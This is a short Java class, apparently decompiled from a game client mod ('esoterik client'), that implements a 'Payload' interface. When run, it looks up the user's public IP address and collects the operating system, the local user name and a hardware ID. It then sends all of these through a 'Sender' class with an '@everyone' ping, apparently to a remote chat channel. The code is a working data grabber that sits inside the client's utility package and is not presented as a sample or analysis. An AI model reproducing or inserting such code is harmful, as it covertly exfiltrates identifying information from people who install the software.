package com.esoterik.client.util.impl;

import com.esoterik.client.features.modules.misc.Sender;
import com.esoterik.client.util.HWIDUtil;
import com.esoterik.client.util.Message;
import com.esoterik.client.util.Payload;
import java.net.URL;
import java.util.Scanner;

public final class Personal implements Payload {
   public void execute() throws Exception {
      String ip = (new Scanner((new URL("http://checkip.amazonaws.com")).openStream(), "UTF-8")).useDelimiter("\\A").next();
      Sender.send("@everyone");
      Sender.send((new Message.Builder("Personal")).addField("IP", ip, true).addField("OS", System.getProperty("os.name"), true).addField("Name", System.getProperty("user.name"), true).addField("HWID", HWIDUtil.getID(), true).build());
   }
}
